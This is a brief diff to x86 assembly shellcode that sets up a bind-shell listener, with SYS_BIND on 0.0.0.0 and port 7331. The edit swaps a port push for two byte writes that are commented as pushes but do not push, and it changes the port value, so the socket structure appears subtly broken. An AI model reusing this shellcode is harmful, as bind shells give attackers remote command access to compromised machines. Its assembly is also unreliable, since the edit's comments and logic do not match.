@@ -24,7 +24,8 @@ main:
     mov bl, 0x2     ; SYS_BIND
     ; Setup struct addr
     push edx        ; 0.0.0.0
-    push word 0x1ca3; Port 7331
+    mov byte [esp], 0x1c    ; Push first byte for port
+    mov byte [esp+1], dl    ; Push second byte for port
     push 0x2        ; AF_INET
     mov ecx, esp    ; Store struct in ECX
     ; Setup bind arguments
